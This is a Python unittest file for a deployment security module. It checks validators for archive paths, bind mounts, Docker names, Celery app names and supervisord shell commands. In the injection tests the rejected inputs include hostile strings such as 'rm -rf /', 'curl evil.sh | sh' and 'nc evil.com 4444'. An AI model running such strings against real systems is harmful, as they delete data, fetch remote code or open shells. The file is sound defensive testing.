"""
Tests for ``deployments.common.security``.
"""

import os
import unittest
import zipfile
import tempfile
import io

from deployments.common.security import (
    is_safe_archive_name,
    is_zip_symlink,
    safe_join,
    validate_bind_source,
    validate_docker_name,
    validate_celery_app,
    validate_shell_command,
    sanitize_route_name,
)
from deployments.common.exceptions import DeploymentSecurityError


class TestSafeArchiveName(unittest.TestCase):

    def test_safe_relative_path(self):
        self.assertTrue(is_safe_archive_name("app/main.py"))
        self.assertTrue(is_safe_archive_name("src/utils/helpers.py"))

    def test_rejects_absolute(self):
        self.assertFalse(is_safe_archive_name("/etc/passwd"))
        self.assertFalse(is_safe_archive_name("/root/.ssh/id_rsa"))

    def test_rejects_parent_traversal(self):
        self.assertFalse(is_safe_archive_name("../secret"))
        self.assertFalse(is_safe_archive_name("app/../../secret"))
        self.assertFalse(is_safe_archive_name("app/../../etc/passwd"))

    def test_rejects_empty_and_dot(self):
        self.assertFalse(is_safe_archive_name(""))
        self.assertFalse(is_safe_archive_name("."))
        self.assertFalse(is_safe_archive_name(".."))

    def test_rejects_windows_drive(self):
        self.assertFalse(is_safe_archive_name("C:\\Windows\\System32"))
        self.assertFalse(is_safe_archive_name("C:/Windows/System32"))

    def test_backslash_normalised(self):
        # Backslash is normalised to forward slash before checking
        self.assertTrue(is_safe_archive_name("app\\main.py"))


class TestIsZipSymlink(unittest.TestCase):

    def _make_zip_info(self, mode: int) -> zipfile.ZipInfo:
        info = zipfile.ZipInfo(filename="test")
        # external_attr stores mode in upper 16 bits
        info.external_attr = (mode & 0xFFFF) << 16
        return info

    def test_regular_file(self):
        info = self._make_zip_info(0o100644)  # regular file
        self.assertFalse(is_zip_symlink(info))

    def test_symlink(self):
        info = self._make_zip_info(0o120777)  # symlink
        self.assertTrue(is_zip_symlink(info))

    def test_directory(self):
        info = self._make_zip_info(0o040755)  # directory
        self.assertFalse(is_zip_symlink(info))


class TestSafeJoin(unittest.TestCase):

    def test_safe_member(self):
        with tempfile.TemporaryDirectory() as base:
            result = safe_join(base, "app/main.py")
            self.assertTrue(result.startswith(os.path.abspath(base)))

    def test_traversal_rejected(self):
        with tempfile.TemporaryDirectory() as base:
            with self.assertRaises(DeploymentSecurityError):
                safe_join(base, "../escape")


class TestValidateBindSource(unittest.TestCase):

    def test_rejects_empty(self):
        with self.assertRaises(DeploymentSecurityError):
            validate_bind_source("")

    def test_rejects_root(self):
        with self.assertRaises(DeploymentSecurityError):
            validate_bind_source("/")

    def test_rejects_etc(self):
        with self.assertRaises(DeploymentSecurityError):
            validate_bind_source("/etc")

    def test_rejects_docker_sock(self):
        with self.assertRaises(DeploymentSecurityError):
            validate_bind_source("/var/run/docker.sock")

    def test_rejects_root_home(self):
        with self.assertRaises(DeploymentSecurityError):
            validate_bind_source("/root")

    def test_accepts_allowed_prefix(self):
        # Patch the allow-list to include /tmp for the test
        import deployments.common.security as sec
        original = sec._DEFAULT_ALLOWED_BIND_PREFIXES
        sec._DEFAULT_ALLOWED_BIND_PREFIXES = ("/tmp/",)
        try:
            result = validate_bind_source("/tmp/myapp/data")
            self.assertTrue(result.startswith("/tmp/"))
        finally:
            sec._DEFAULT_ALLOWED_BIND_PREFIXES = original


class TestValidateDockerName(unittest.TestCase):

    def test_valid_names(self):
        validate_docker_name("my-app")
        validate_docker_name("my_app_1")
        validate_docker_name("MyApp.production-2")

    def test_rejects_empty(self):
        with self.assertRaises(DeploymentSecurityError):
            validate_docker_name("")

    def test_rejects_leading_dot(self):
        with self.assertRaises(DeploymentSecurityError):
            validate_docker_name(".hidden")

    def test_rejects_leading_dash(self):
        with self.assertRaises(DeploymentSecurityError):
            validate_docker_name("-leading-dash")

    def test_rejects_spaces(self):
        with self.assertRaises(DeploymentSecurityError):
            validate_docker_name("my app")

    def test_rejects_too_long(self):
        with self.assertRaises(DeploymentSecurityError):
            validate_docker_name("a" * 300)


class TestValidateCeleryApp(unittest.TestCase):

    def test_valid_module_paths(self):
        self.assertEqual(validate_celery_app("app"), "app")
        self.assertEqual(validate_celery_app("myproject"), "myproject")
        self.assertEqual(validate_celery_app("pkg.subpkg.module"), "pkg.subpkg.module")
        self.assertEqual(validate_celery_app("config"), "config")

    def test_rejects_shell_injection(self):
        # This is the critical security test — without validation, a
        # value like "app; rm -rf /" would be interpolated into a
        # supervisord command= line and executed by sh -c.
        for malicious in (
            "app; rm -rf /",
            "app & curl evil.sh | sh",
            "app | nc evil.com 4444",
            "app`whoami`",
            "app$(id)",
            "app\nrm -rf /",
            "../app",
            "app/../etc",
        ):
            with self.assertRaises(DeploymentSecurityError, msg=f"should reject {malicious!r}"):
                validate_celery_app(malicious)

    def test_rejects_empty(self):
        with self.assertRaises(DeploymentSecurityError):
            validate_celery_app("")
        with self.assertRaises(DeploymentSecurityError):
            validate_celery_app("   ")


class TestValidateShellCommand(unittest.TestCase):

    def test_valid_commands(self):
        self.assertEqual(
            validate_shell_command("gunicorn app:application --bind 0.0.0.0:8000"),
            "gunicorn app:application --bind 0.0.0.0:8000",
        )
        self.assertEqual(
            validate_shell_command("uvicorn main:app --host 0.0.0.0 --port 8000"),
            "uvicorn main:app --host 0.0.0.0 --port 8000",
        )

    def test_rejects_shell_metacharacters(self):
        # Critical: supervisord command= is parsed by sh -c, so any shell
        # metacharacter allows arbitrary command execution.
        for malicious in (
            "gunicorn app:app; rm -rf /",
            "gunicorn app:app & curl evil | sh",
            "gunicorn app:app | nc evil 4444",
            "gunicorn app:app`whoami`",
            "gunicorn app:app$(id)",
            "gunicorn app:app > /etc/passwd",
            "gunicorn app:app < /dev/null",
        ):
            with self.assertRaises(DeploymentSecurityError, msg=f"should reject {malicious!r}"):
                validate_shell_command(malicious)

    def test_rejects_empty(self):
        with self.assertRaises(DeploymentSecurityError):
            validate_shell_command("")
        with self.assertRaises(DeploymentSecurityError):
            validate_shell_command("   ")

    def test_rejects_too_long(self):
        with self.assertRaises(DeploymentSecurityError):
            validate_shell_command("x" * 5000)


class TestSanitizeRouteName(unittest.TestCase):

    def test_passthrough_safe(self):
        self.assertEqual(sanitize_route_name("my-app"), "my-app")
        self.assertEqual(sanitize_route_name("my_app.1"), "my_app.1")

    def test_strips_backticks(self):
        # Backticks in a Traefik Host() rule could break parsing.
        result = sanitize_route_name("evil`malicious")
        self.assertNotIn("`", result)

    def test_strips_whitespace(self):
        result = sanitize_route_name("my app")
        self.assertNotIn(" ", result)

    def test_empty_fallback(self):
        self.assertEqual(sanitize_route_name(""), "service")
        self.assertEqual(sanitize_route_name("---"), "service")


if __name__ == "__main__":
    unittest.main()


class TestDeploymentHardeningRegression(unittest.TestCase):
    def test_container_network_fallback_is_fail_closed(self):
        from pathlib import Path
        source = Path(__file__).resolve().parents[1] / "core" / "manager" / "container_manager.py"
        text = source.read_text()
        self.assertIn("Refusing to fall back to Docker's default", text)
        self.assertIn("raise ContainerError", text)

    def test_security_fallback_does_not_strip_no_new_privileges(self):
        from pathlib import Path
        source = Path(__file__).resolve().parents[1] / "core" / "manager" / "container_manager.py"
        text = source.read_text()
        self.assertNotIn('("without security_opt"', text)
        self.assertNotIn('("bare (binds+ports+read_only only)"', text)
